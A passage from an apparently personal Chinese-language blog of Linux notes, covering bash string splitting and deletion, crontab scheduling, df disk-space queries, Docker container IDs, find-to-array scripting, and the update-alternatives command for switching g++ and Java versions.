<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;apple,banana,cherry&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;,&#x27;</span> -f1  <span class="comment"># apple</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;,&#x27;</span> -f2  <span class="comment"># banana</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;,&#x27;</span> -f3  <span class="comment"># cherry</span></span><br></pre></td></tr></table></figure>

<h3 id="3-使用-awk"><a href="#3-使用-awk" class="headerlink" title="3. 使用 awk"></a>3. 使用 <code>awk</code></h3><p><code>awk</code> 是一个强大的文本处理工具，可以用来分割字符串。以下是一个示例：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;apple,banana,cherry&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span> | awk -F<span class="string">&#x27;,&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>  <span class="comment"># apple</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span> | awk -F<span class="string">&#x27;,&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>  <span class="comment"># banana</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span> | awk -F<span class="string">&#x27;,&#x27;</span> <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>  <span class="comment"># cherry</span></span><br></pre></td></tr></table></figure>

<h3 id="4-使用-tr-和-while-循环"><a href="#4-使用-tr-和-while-循环" class="headerlink" title="4. 使用 tr 和 while 循环"></a>4. 使用 <code>tr</code> 和 <code>while</code> 循环</h3><p><code>tr</code> 命令可以用来替换字符。结合 <code>while</code> 循环，可以逐个处理字符串中的每个部分。以下是一个示例：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;apple,banana,cherry&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span> | <span class="built_in">tr</span> <span class="string">&#x27;,&#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> element</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$element</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="5-使用参数扩展"><a href="#5-使用参数扩展" class="headerlink" title="5. 使用参数扩展"></a>5. 使用参数扩展</h3><p>在 Bash 中，还可以使用参数扩展进行简单的字符串分割：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;apple,banana,cherry&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 截取第一个逗号前的部分</span></span><br><span class="line">part1=<span class="string">&quot;<span class="variable">$&#123;str%%,*&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$part1</span>&quot;</span>  <span class="comment"># apple</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 截取第一个逗号后的部分</span></span><br><span class="line">remaining=<span class="string">&quot;<span class="variable">$&#123;str#*,&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次截取</span></span><br><span class="line">part2=<span class="string">&quot;<span class="variable">$&#123;remaining%%,*&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$part2</span>&quot;</span>  <span class="comment"># banana</span></span><br><span class="line">part3=<span class="string">&quot;<span class="variable">$&#123;remaining#*,&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$part3</span>&quot;</span>  <span class="comment"># cherry</span></span><br></pre></td></tr></table></figure>

<p>这些方法可以帮助你在 Shell 脚本中进行字符串分割。选择最适合你需求的方法，并根据需要调整分隔符和字符串。</p>
<h2 id="在shell-script中以某用户身份执行命令"><a href="#在shell-script中以某用户身份执行命令" class="headerlink" title="在shell script中以某用户身份执行命令"></a>在shell script中以某用户身份执行命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"><span class="built_in">sudo</span> -S bash -c <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<h2 id="linux-写一个定时刷新的24h运行脚本"><a href="#linux-写一个定时刷新的24h运行脚本" class="headerlink" title="linux 写一个定时刷新的24h运行脚本"></a>linux 写一个定时刷新的24h运行脚本</h2><p>你可以使用<code>crontab</code>来创建一个定时刷新的脚本。<code>crontab</code>是一个用于在Linux系统上定期执行任务的工具。下面是一个示例，假设你有一个名为<code>refresh.sh</code>的脚本，你想每天定时运行：</p>
<p>首先，创建一个<code>refresh.sh</code>脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是你的刷新任务脚本内容</span></span><br><span class="line"><span class="comment"># 例如，你可以在这里写下你想要执行的任务</span></span><br><span class="line"><span class="comment"># 比如，刷新某个文件夹下的内容</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running refresh script at <span class="subst">$(date)</span>&quot;</span></span><br><span class="line"><span class="comment"># 在这里执行你的刷新任务</span></span><br></pre></td></tr></table></figure>

<p>保存并退出。</p>
<p>接下来，编辑你的<code>crontab</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>

<p>在编辑器中添加以下行，表示每天的0点执行<code>refresh.sh</code>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * * * /path/to/refresh.sh</span><br></pre></td></tr></table></figure>

<p>确保将<code>/path/to/refresh.sh</code>替换为你实际的<code>refresh.sh</code>脚本的路径。</p>
<p>保存并退出编辑器。</p>
<p>这将使你的<code>refresh.sh</code>脚本每天的午夜被执行，从而实现了24小时定时刷新的需求。</p>
<h2 id="linux-stat-获取指定目录的空闲空间"><a href="#linux-stat-获取指定目录的空闲空间" class="headerlink" title="linux stat 获取指定目录的空闲空间"></a>linux stat 获取指定目录的空闲空间</h2><p>你可以使用 <code>stat</code> 命令获取文件系统的信息，但是 <code>stat</code> 命令不能直接获取指定目录的空闲空间。要获取指定目录的空闲空间，你可以使用 <code>df</code> 命令。</p>
<p>以下是一个示例 Bash 脚本，用于获取指定目录的空闲空间：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要获取空间信息的目录</span></span><br><span class="line">directory=<span class="string">&quot;/path/to/your/directory&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目录所在的文件系统</span></span><br><span class="line">filesystem=$(<span class="built_in">df</span> -P <span class="string">&quot;<span class="variable">$directory</span>&quot;</span> | awk <span class="string">&#x27;NR==2 &#123;print $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件系统的空闲空间</span></span><br><span class="line">free_space=$(<span class="built_in">df</span> -P <span class="string">&quot;<span class="variable">$filesystem</span>&quot;</span> | awk <span class="string">&#x27;NR==2 &#123;print $4&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Free space in <span class="variable">$directory</span> : <span class="variable">$free_space</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个脚本中，你需要将 <code>/path/to/your/directory</code> 替换为你要查询空间信息的目录路径。脚本将首先使用 <code>df</code> 命令获取该目录所在的文件系统，然后再次使用 <code>df</code> 命令获取该文件系统的空闲空间。最后，脚本会输出空闲空间的信息。</p>
<p>请注意，这个脚本只是一个简单的示例，适用于大多数情况。在实际使用中，你可能需要更复杂的逻辑来确保脚本的稳健性和安全性。</p>
<h2 id="linux-bash-字符串删除"><a href="#linux-bash-字符串删除" class="headerlink" title="linux bash 字符串删除"></a>linux bash 字符串删除</h2><p>如果你要删除字符串中的特定字符或子字符串，你可以使用 Bash 的内置功能 <code>sed</code>、<code>awk</code> 或字符串操作函数来实现。下面是一些方法示例：</p>
<h3 id="使用-sed-删除字符串中的字符："><a href="#使用-sed-删除字符串中的字符：" class="headerlink" title="使用 sed 删除字符串中的字符："></a>使用 <code>sed</code> 删除字符串中的字符：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始字符串</span></span><br><span class="line">original_string=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除字符串中的空格</span></span><br><span class="line">modified_string=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$original_string</span>&quot;</span> | sed <span class="string">&#x27;s/ //g&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Original string: <span class="variable">$original_string</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Modified string: <span class="variable">$modified_string</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-awk-删除字符串中的字符："><a href="#使用-awk-删除字符串中的字符：" class="headerlink" title="使用 awk 删除字符串中的字符："></a>使用 <code>awk</code> 删除字符串中的字符：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始字符串</span></span><br><span class="line">original_string=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除字符串中的空格</span></span><br><span class="line">modified_string=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$original_string</span>&quot;</span> | awk <span class="string">&#x27;&#123;gsub(&quot; &quot;, &quot;&quot;)&#125;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Original string: <span class="variable">$original_string</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Modified string: <span class="variable">$modified_string</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="使用字符串操作函数删除字符串中的子字符串："><a href="#使用字符串操作函数删除字符串中的子字符串：" class="headerlink" title="使用字符串操作函数删除字符串中的子字符串："></a>使用字符串操作函数删除字符串中的子字符串：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始字符串</span></span><br><span class="line">original_string=<span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除字符串中的 &quot;llo&quot; 子字符串</span></span><br><span class="line">substring_to_remove=<span class="string">&quot;llo&quot;</span></span><br><span class="line">modified_string=<span class="string">&quot;<span class="variable">$&#123;original_string//$substring_to_remove&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Original string: <span class="variable">$original_string</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Modified string: <span class="variable">$modified_string</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这些示例中，原始字符串是 “Hello World”，然后使用不同的方法删除了其中的空格或子字符串。你可以根据自己的需求选择其中一种方法。</p>
<h2 id="linux-bash-获取docker容器的id"><a href="#linux-bash-获取docker容器的id" class="headerlink" title="linux bash 获取docker容器的id"></a>linux bash 获取docker容器的id</h2><p>要获取正在运行的 Docker 容器的 ID，你可以使用 Docker 命令行工具。以下是使用 <code>docker ps</code> 命令来获取正在运行容器的 ID 的示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取正在运行的容器的 ID</span></span><br><span class="line">container_id=$(docker ps -q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running Docker container ID: <span class="variable">$container_id</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个脚本中，<code>docker ps -q</code> 命令用于列出正在运行的容器，并使用 <code>-q</code> 参数只显示容器的 ID。然后将结果存储在 <code>container_id</code> 变量中，并输出该变量的值。 </p>
<p>这只会获取第一个正在运行的容器的 ID。如果你想获取特定容器的 ID，你可以使用 <code>docker ps -qf</code> 命令并提供过滤条件，如容器的名称、标签等。例如，要获取名称为 <code>my_container</code> 的容器的 ID，你可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">container_id=$(docker ps -qf <span class="string">&quot;name=my_container&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>你可以根据自己的需要调整这些命令。</p>
<h2 id="linux-find命令找到指定文件并保存到数组中"><a href="#linux-find命令找到指定文件并保存到数组中" class="headerlink" title="linux find命令找到指定文件并保存到数组中"></a>linux find命令找到指定文件并保存到数组中</h2><p>在Linux中，<code>find</code>命令用于查找文件和目录。如果你想使用<code>find</code>命令找到指定文件并将结果保存到一个数组中，你可以使用以下方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 使用 find 命令查找指定文件，并将结果保存到数组</span></span><br><span class="line">files_array=($(find /path/to/search -name <span class="string">&quot;your_pattern&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 输出数组内容（可选）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Files found:&quot;</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;files_array[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&quot;libtool -static -o libabsl.a &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;files_array[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> </span><br><span class="line">    cmd=<span class="string">&quot;<span class="variable">$&#123;cmd&#125;</span> <span class="variable">$&#123;file&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cmd:&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;cmd&#125;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中：</p>
<ul>
<li><code>/path/to/search</code> 是你要搜索的目录的路径。</li>
<li><code>&quot;your_pattern&quot;</code> 是你要匹配的文件名模式。你可以使用通配符来匹配文件名的一部分，比如 <code>*.txt</code> 表示所有以 <code>.txt</code> 结尾的文件。</li>
<li><code>files_array</code> 是保存文件列表的数组。</li>
</ul>
<p>请注意，上述代码假设文件和目录名不包含空格。如果你的文件名中可能包含空格，建议使用更复杂的方法来处理，比如使用 <code>find</code> 命令的 <code>-print0</code> 选项以及 <code>readarray</code> 命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 find 命令查找指定文件，将结果以空字符分隔保存到数组</span></span><br><span class="line"><span class="built_in">readarray</span> -d <span class="string">&#x27;&#x27;</span> files_array &lt; &lt;(find /path/to/search -name <span class="string">&quot;your_pattern&quot;</span> -print0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出数组内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Files found:&quot;</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;files_array[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这种方法通过 <code>-print0</code> 选项和 <code>readarray -d &#39;&#39;</code> 的配合，确保了对文件名中可能包含的空格进行正确处理。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/linux_2_%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2024-05-22-linux_2_83_update-alternatives/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/linux_2_%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2024-05-22-linux_2_83_update-alternatives/" class="post-title-link" itemprop="url">linux_2_83_update-alternatives</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>update-alternatives命令</li>
</ul>
<h2 id="linux-g-多版本管理"><a href="#linux-g-多版本管理" class="headerlink" title="linux g++ 多版本管理"></a>linux g++ 多版本管理</h2><p>在 Linux 系统上，你可以使用 <code>update-alternatives</code> 来进行多版本管理，特别是对于编译器如 <code>g++</code> 的管理。这允许你在系统上安装多个版本的 <code>g++</code>，并通过 <code>update-alternatives</code> 选择默认版本。</p>
<p>以下是一个简单的步骤来实现 <code>g++</code> 多版本管理：</p>
<ol>
<li><p><strong>安装多个版本的 g++：</strong></p>
<p>首先，确保你已经安装了要管理的多个版本的 <code>g++</code>。你可以使用包管理工具如 <code>apt</code>、<code>yum</code> 或者 <code>dnf</code> 进行安装。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install g++-version1 g++-version2</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install g++-7 g++-8</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 <code>update-alternatives</code> 配置 g++：</strong></p>
<p>使用 <code>update-alternatives</code> 添加和配置 <code>g++</code> 的备选项。以下是一个示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-7 100</span><br><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-8 90</span><br></pre></td></tr></table></figure>

<p>这里，我们给 <code>g++-7</code> 和 <code>g++-8</code> 分别分配了优先级 100 和 90。较高优先级的版本将成为默认版本。</p>
</li>
<li><p><strong>选择默认版本：</strong></p>
<p>使用 <code>update-alternatives --config g++</code> 来选择默认的 <code>g++</code> 版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --config g++</span><br></pre></td></tr></table></figure>

<p>这将显示一个菜单，让你选择要设置为默认的 <code>g++</code> 版本。</p>
</li>
<li><p><strong>验证版本：</strong></p>
<p>使用以下命令验证 <code>g++</code> 的当前版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ --version</span><br></pre></td></tr></table></figure>

<p>确保显示的版本号是你选择的默认版本。</p>
</li>
</ol>
<p>通过这种方式，你可以方便地在系统上安装和管理多个版本的 <code>g++</code>。这对于处理不同项目或依赖不同 <code>C++</code> 标准的情况非常有用。</p>
<h2 id="linux-update-alternatives命令-是什么"><a href="#linux-update-alternatives命令-是什么" class="headerlink" title="linux update-alternatives命令 是什么"></a>linux update-alternatives命令 是什么</h2><p><code>update-alternatives</code> 是一个用于管理 Linux 系统上多个软件版本或者实现的工具的命令。它允许你在系统中选择默认的软件版本或者实现，而不必手动修改符号链接或者其他相关的配置文件。</p>
<p>通过 <code>update-alternatives</code>，你可以为系统中的特定命令或者服务设置不同的备选项，然后选择默认的备选项。这对于系统管理员来说是一个方便的工具，因为它可以在不同版本之间切换而不会导致配置混乱。</p>
<p>例如，假设你有多个版本的 Java 安装在系统上，你可以使用 <code>update-alternatives</code> 来选择默认使用的 Java 版本，而无需手动更改符号链接或者其他相关配置。</p>
<p>命令的基本语法如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --config &lt;name-of-alternative&gt;</span><br></pre></td></tr></table></figure>

<p>其中 <code>&lt;name-of-alternative&gt;</code> 是你要配置的备选项的名称。这个命令会显示一个菜单，列出可用的备选项，你可以选择其中一个作为默认。</p>
<p>要添加新的备选项，你可以使用 <code>--install</code> 选项。具体的用法可以通过 <code>man update-alternatives</code> 查看命令的手册页面来获取更多信息。</p>
<h2 id="linux-update-alternatives命令-详解"><a href="#linux-update-alternatives命令-详解" class="headerlink" title="linux update-alternatives命令 详解"></a>linux update-alternatives命令 详解</h2><p><code>update-alternatives</code> 命令用于管理系统上的备选项，例如不同版本的软件、命令或服务。通过该命令，用户可以方便地在备选项之间切换，而无需手动编辑配置文件。以下是该命令的详细解释：</p>
<h3 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives [options] --config &lt;name-of-alternative&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;name-of-alternative&gt;</code>: 要管理的备选项的名称。</li>
</ul>
<h3 id="常用选项："><a href="#常用选项：" class="headerlink" title="常用选项："></a>常用选项：</h3><ul>
<li><p><code>--install &lt;link&gt; &lt;name&gt; &lt;path&gt; &lt;priority&gt;</code>: 添加一个备选项。这个选项用于将一个备选项加入到系统中。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --install /usr/bin/java java /usr/java/jdk1.8.0_171/bin/java 1</span><br></pre></td></tr></table></figure>

<p>这个命令将 JDK 1.8.0_171 的 Java 可执行文件添加为备选项。</p>
</li>
<li><p><code>--config &lt;name-of-alternative&gt;</code>: 配置默认的备选项。这个选项用于在多个备选项中选择一个作为默认值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --config java</span><br></pre></td></tr></table></figure>

<p>用户将会看到一个菜单，可以选择要使用的 Java 版本。</p>
</li>
<li><p><code>--display &lt;name-of-alternative&gt;</code>: 显示指定备选项的信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --display java</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>--remove &lt;name-of-alternative&gt; &lt;path&gt;</code>: 从备选项列表中删除一个备选项。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-alternatives --remove java /usr/java/jdk1.8.0_171/bin/java</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="工作流程："><a href="#工作流程：" class="headerlink" title="工作流程："></a>工作流程：</h3><ol>
<li><p><strong>安装备选项：</strong> 使用 <code>--install</code> 选项将备选项添加到系统。</p>
</li>
<li><p><strong>配置默认备选项：</strong> 使用 <code>--config</code> 选项选择默认的备选项。</p>
</li>
<li><p><strong>显示备选项信息：</strong> 使用 <code>--display</code> 可以查看备选项的信息，包括路径、符号链接等。</p>
</li>
<li><p><strong>删除备选项：</strong> 使用 <code>--remove</code> 选项可以从备选项列表中删除不再需要的备选项。</p>
</li>
</ol>
